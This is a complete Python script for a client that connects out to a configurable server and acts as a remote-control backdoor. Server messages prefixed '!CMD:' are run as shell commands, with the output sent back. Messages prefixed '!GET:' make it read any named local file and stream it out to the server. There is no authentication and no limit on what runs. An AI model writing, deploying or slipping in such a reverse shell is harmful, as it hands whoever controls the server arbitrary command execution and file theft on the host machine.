import socket
import subprocess
import threading
import os

HEADER = 64
PORT = <port-number> # Change this to the port number of your server
FORMAT = "utf-8"
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "<ip-address>"  # Change this to the IP address of your server
ADDRESS = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDRESS)

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

def send_message(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

def receive():
    while True:
        try:
            msg_length = client.recv(HEADER).decode(FORMAT)
            if msg_length:
                msg_length = int(msg_length)
                msg = client.recv(msg_length).decode(FORMAT)
                if msg.startswith("!CMD:"):
                    command = msg[5:]
                    result = execute_command(command)
                    send_message(f"Command result: {result}")
                elif msg.startswith("!GET:"):
                    filename = msg[5:]
                    if os.path.isfile(filename):
                        filesize = os.path.getsize(filename)
                        client.sendall(str(filesize).encode(FORMAT))
                        with open(filename, 'rb') as f:
                            for _ in range(filesize // 4096 + 1):
                                bytes_read = f.read(4096)
                                if not bytes_read:
                                    break
                                client.sendall(bytes_read)
                    else:
                        send_message("File does not exist.")

        except Exception as e:
            print(f"Error in receive: {e}", flush=True)
            break

receive_thread = threading.Thread(target=receive)
receive_thread.start()

print("Type '!DISCONNECT' to exit.")
while True:
    msg = input()
    send_message(msg)
    if msg == DISCONNECT_MESSAGE:
        break
